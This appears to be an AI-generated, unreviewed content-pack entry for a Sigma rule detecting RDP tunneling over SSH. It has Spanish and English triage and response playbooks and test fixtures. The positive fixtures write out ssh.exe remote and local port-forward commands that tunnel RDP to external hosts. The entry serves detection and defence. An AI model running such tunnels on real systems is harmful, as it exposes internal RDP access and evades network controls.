@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "f7d7ebd5-a016-46e2-9c54-f9932f2d386d",
+    "title": "Potential RDP Tunneling Via SSH",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_ssh_rdp_tunneling.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_ssh_rdp_tunneling.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1572"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó ssh.exe en un endpoint Windows con una línea de comandos que hace referencia al puerto 3389 (RDP), lo que sugiere un túnel SSH para reenviar o exponer RDP.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en \\ssh.exe y CommandLine contiene ':3389', típico de reenvío de puertos local (-L) o remoto (-R) hacia el servicio RDP.",
+      "why_it_matters": "Tunelizar RDP sobre SSH (ATT&CK T1572, Protocol Tunneling) permite a un atacante evadir firewalls y controles de red, mantener acceso interactivo remoto y moverse lateralmente o exfiltrar datos sobre un canal cifrado.",
+      "triage_steps": [
+        "Revise CommandLine: identifique -L o -R, el host y puerto de destino, el usuario SSH y el servidor remoto (IP o dominio).",
+        "Valide la ruta de Image: ssh.exe legítimo suele estar en C:\\Windows\\System32\\OpenSSH; otra ubicación o un hash desconocido es sospechoso.",
+        "Examine ParentImage y la cadena de procesos: cmd.exe, powershell.exe o un proceso de oficina como padre requieren mayor atención.",
+        "Identifique al usuario y confirme si es administrador o personal de TI con motivo legítimo para usar túneles SSH.",
+        "Revise conexiones de red salientes del host hacia el servidor SSH (puerto 22 u otro) y su reputación.",
+        "Busque inicios de sesión RDP (Event ID 4624 tipo 10, 1149) desde 127.0.0.1 o ::1 en el mismo host +/- 15 minutos.",
+        "Busque alertas previas del mismo host, usuario o IP remota, incluyendo uso de plink.exe u otras herramientas de túnel."
+      ],
+      "false_positives": [
+        "Administradores que usan túneles SSH para acceder por RDP a servidores detrás de un bastión autorizado.",
+        "Scripts de soporte remoto o automatización de TI documentados que reenvían RDP mediante OpenSSH."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o su responsable si el túnel está autorizado; documente la evidencia antes de actuar.",
+        "Si no está autorizado, aísle el endpoint y bloquee la IP o dominio del servidor SSH remoto en el perímetro.",
+        "Finalice el proceso ssh.exe, revise claves SSH, archivos de configuración y persistencia asociados, y elimínelos tras verificar.",
+        "Restablezca credenciales del usuario y de cuentas usadas por RDP; revise sesiones RDP recientes y posibles datos exfiltrados.",
+        "Restrinja el uso de OpenSSH cliente y el tráfico SSH saliente mediante políticas cuando no sea necesario."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque reenviar RDP mediante SSH rara vez es legítimo en estaciones de usuarios y otorga acceso interactivo remoto que evade controles perimetrales."
+    },
+    "en": {
+      "summary": "ssh.exe ran on a Windows endpoint with a command line referencing port 3389 (RDP), suggesting an SSH tunnel used to forward or expose RDP.",
+      "what_it_detects": "Process creation events where Image ends with \\ssh.exe and CommandLine contains ':3389', typical of local (-L) or remote (-R) port forwarding to the RDP service.",
+      "why_it_matters": "Tunneling RDP over SSH (ATT&CK T1572, Protocol Tunneling) lets an attacker bypass firewalls, keep interactive remote access, and move laterally or exfiltrate data over an encrypted channel.",
+      "triage_steps": [
+        "Read CommandLine: identify -L or -R, the forwarded host and port, the SSH user and the remote server (IP or domain).",
+        "Validate the Image path: legitimate ssh.exe usually lives in C:\\Windows\\System32\\OpenSSH; other locations or unknown hashes are suspicious.",
+        "Inspect ParentImage and the process tree; cmd.exe, powershell.exe or Office applications as parent need closer review.",
+        "Identify the user and confirm whether they are an admin or IT staff with a legitimate reason for SSH tunnels.",
+        "Review outbound connections from the host to the SSH server (port 22 or other) and check its reputation.",
+        "Look for RDP logons (Event ID 4624 type 10, 1149) from 127.0.0.1 or ::1 on the same host within +/- 15 minutes.",
+        "Search earlier alerts for the same host, user or remote IP, including plink.exe or other tunneling tools."
+      ],
+      "false_positives": [
+        "Administrators using SSH tunnels to RDP into servers behind an authorized bastion host.",
+        "Documented remote support or IT automation scripts that forward RDP through OpenSSH."
+      ],
+      "response_steps": [
+        "Confirm with the user or their manager whether the tunnel is authorized; preserve evidence before acting.",
+        "If unauthorized, isolate the endpoint and block the remote SSH server IP or domain at the perimeter.",
+        "Kill the ssh.exe process; review and, after verification, remove related SSH keys, config files and persistence.",
+        "Reset credentials for the user and accounts used over RDP; review recent RDP sessions and possible data exfiltration.",
+        "Restrict the OpenSSH client and outbound SSH traffic by policy where not required."
+      ],
+      "severity_rationale": "High fits because forwarding RDP over SSH is rarely legitimate on user workstations and gives interactive remote access that bypasses perimeter controls."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Remote port forward exposing local RDP to an external SSH server",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
+          "CommandLine": "ssh.exe -N -R 13389:127.0.0.1:3389 tunnel@203.0.113.25",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -NoProfile"
+        }
+      },
+      {
+        "description": "Local port forward from a user-writable path to an internal server's RDP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\mrojas\\AppData\\Local\\Temp\\ssh.exe",
+          "CommandLine": "\"C:\\Users\\mrojas\\AppData\\Local\\Temp\\ssh.exe\" -L 4444:10.10.5.20:3389 ops@198.51.100.40 -p 443",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c start.bat"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Normal interactive SSH session without any RDP port forwarding",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
+          "CommandLine": "ssh.exe admin@bastion-01.example.com",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe"
+        }
+      },
+      {
+        "description": "plink.exe forwarding RDP; Image does not end with \\ssh.exe (covered by a related rule)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\PuTTY\\plink.exe",
+          "CommandLine": "plink.exe -R 13389:127.0.0.1:3389 tunnel@203.0.113.25",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
